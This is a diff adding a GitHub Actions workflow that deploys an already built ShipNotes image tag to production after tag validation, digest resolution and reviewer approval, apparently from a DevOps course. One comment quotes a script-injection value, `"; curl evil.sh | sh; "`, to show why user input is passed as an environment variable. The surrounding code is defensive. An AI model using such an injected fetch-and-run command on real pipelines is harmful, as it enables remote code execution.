@@ -1,0 +1,150 @@
+# ShipNotes deploy: put an ALREADY BUILT image tag into production, with approval.
+#
+#   gh workflow run deploy.yml -f image_tag=sha-a1b2c3d      (or v1.2.0)
+#
+#   verify ───────────────> deploy  [environment: production]
+#   tag format ok?          waits for a required reviewer to click "Approve",
+#   both images exist?      then runs with production's secrets and variables.
+#   resolve digests         Module 3: prints the plan. Module 4: runs it over SSH/SSM.
+#
+# This workflow never builds anything. It only moves a tag that release.yml
+# built, scanned and pushed. Rollback = run it again with the previous tag.
+#
+# Setup (Lab 3.5): Settings > Environments > production
+#   - Required reviewers: you
+#   - Deployment branches: protected branches only (= main)
+#   - Variable APP_URL (placeholder until Module 4 creates the server and load balancer)
+#   Module 4 adds the secrets AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, EC2_SSH_PRIVATE_KEY,
+#   ANSIBLE_VAULT_PASSWORD and the variable EC2_INSTANCE_ID.
+#
+# SHA-pinned form (Lab 3.8):
+#   uses: docker/login-action@dbcb813823bdd20940b903addbd779551569679f # v4.6.0
+
+name: deploy
+
+# Shown as the run title in the Actions list, instead of just "deploy".
+run-name: deploy ${{ inputs.image_tag }} to production (by @${{ github.actor }})
+
+on:
+  workflow_dispatch:
+    inputs:
+      image_tag:
+        description: "Image tag to deploy: sha-<7 chars> or v<semver>. Must already exist in GHCR."
+        required: true
+        type: string
+
+permissions:
+  contents: read
+
+# One production deploy at a time, and never cancel one that is running: a
+# deploy killed half way leaves the server between two versions. A second
+# request waits in the queue instead.
+concurrency:
+  group: deploy-production
+  cancel-in-progress: false
+
+defaults:
+  run:
+    shell: bash
+
+env:
+  IMAGE_PREFIX: ghcr.io/${{ github.repository_owner }}/shipnotes
+
+jobs:
+  # ---------------------------------------------------------------------------
+  # Cheap checks BEFORE a human is asked to approve. Nobody should approve a
+  # deploy of a tag that does not exist.
+  # ---------------------------------------------------------------------------
+  verify:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 5
+    permissions:
+      contents: read
+      packages: read           # inspect images even while the packages are private
+    outputs:
+      api_digest: ${{ steps.resolve.outputs.api_digest }}
+      frontend_digest: ${{ steps.resolve.outputs.frontend_digest }}
+    steps:
+      # The input is user-controlled text. It reaches the script as an env
+      # var (data), never as ${{ inputs.image_tag }} inside `run:` (code).
+      # Inline interpolation would let `"; curl evil.sh | sh; "` run.
+      - name: Validate tag format
+        env:
+          IMAGE_TAG: ${{ inputs.image_tag }}
+        run: |
+          if [[ ! "$IMAGE_TAG" =~ ^(sha-[0-9a-f]{7}|v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?)$ ]]; then
+            echo "::error::'$IMAGE_TAG' is not sha-<7 hex chars> or v<semver>"
+            exit 1
+          fi
+
+      - uses: docker/login-action@v4
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      # A tag can be moved; a digest cannot. We resolve the digests now and
+      # deploy those, so what gets approved is exactly what gets deployed.
+      - name: Resolve image digests
+        id: resolve
+        env:
+          IMAGE_TAG: ${{ inputs.image_tag }}
+        run: |
+          for svc in api frontend; do
+            ref="${IMAGE_PREFIX}-${svc}:${IMAGE_TAG}"
+            if ! digest=$(docker buildx imagetools inspect "$ref" --format '{{json .Manifest}}' | jq -r .digest); then
+              echo "::error::$ref not found in GHCR. Did release.yml push it?"
+              exit 1
+            fi
+            echo "${svc}_digest=${digest}" >> "$GITHUB_OUTPUT"
+            echo "${ref} -> ${digest}"
+          done
+
+  # ---------------------------------------------------------------------------
+  deploy:
+    needs: verify
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    # The job pauses here until a required reviewer approves (Review deployments
+    # button on the run page). Only after approval does it receive the
+    # environment's secrets and variables. The environment also refuses runs
+    # from unprotected branches.
+    environment: production
+    # Module 4 adds: url: https://<your-domain>  (shown on the run page)
+    permissions:
+      contents: read
+    steps:
+      # STUB. Module 4 replaces this step with the real thing: SSH (or AWS SSM)
+      # to the EC2 host and run the plan below. The values printed here are
+      # the exact inputs that step will use.
+      - name: Deploy plan (stub until Module 4)
+        env:
+          IMAGE_TAG: ${{ inputs.image_tag }}
+          API_DIGEST: ${{ needs.verify.outputs.api_digest }}
+          FRONTEND_DIGEST: ${{ needs.verify.outputs.frontend_digest }}
+          # Environment variable (Settings > Environments > production > Variables).
+          # Not a secret: a URL is not sensitive. Keys and passwords go in
+          # environment SECRETS (secrets.EC2_SSH_PRIVATE_KEY in Module 4).
+          APP_URL: ${{ vars.APP_URL || 'not-provisioned-yet' }}
+          OWNER: ${{ github.repository_owner }}
+        run: |
+          plan=$(cat <<EOF
+          target:    ${APP_URL}
+          api:       ${IMAGE_PREFIX}-api:${IMAGE_TAG}@${API_DIGEST}
+          frontend:  ${IMAGE_PREFIX}-frontend:${IMAGE_TAG}@${FRONTEND_DIGEST}
+
+          on the server, in /opt/shipnotes:
+            export GITHUB_USER=${OWNER} IMAGE_TAG=${IMAGE_TAG}
+            docker compose -f compose.yaml pull
+            docker compose -f compose.yaml up -d --no-build --wait
+            curl -fsS http://localhost:8080/health
+          EOF
+          )
+          echo "$plan"
+          {
+            echo "### Deploy plan: ${IMAGE_TAG} -> production"
+            echo '```'
+            echo "$plan"
+            echo '```'
+            echo "_Stub: Module 4 executes this over SSH/SSM._"
+          } >> "$GITHUB_STEP_SUMMARY"
